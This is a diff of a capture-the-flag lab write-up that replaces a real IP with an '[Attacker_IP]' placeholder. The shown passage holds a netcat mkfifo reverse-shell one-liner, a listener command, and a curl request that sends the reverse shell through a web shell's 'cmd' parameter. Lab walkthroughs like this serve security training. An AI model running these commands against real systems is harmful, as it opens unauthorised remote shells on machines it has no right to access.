@@ -69,13 +69,13 @@ We've located the file we need but we cannot read its content.
 We can try to obtain a ```reverse shell``` with the help of [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#netcat-openbsd).
 After some tries, we are able to find that the only reverse shell working is this one:
 ```
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.99.183 9001 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Attacker_IP] 9001 >/tmp/f
 ```
 ```
 nc -nlvp 9001
 ```
 ```
-curl --silent "http://school.thm/assets/index.php" -G --data-urlencode "cmd=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.99.183 9001 >/tmp/f"
+curl --silent "http://school.thm/assets/index.php" -G --data-urlencode "cmd=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Attacker_IP] 9001 >/tmp/f"
 ```
 However we have no permission to access ```user.txt```.
 
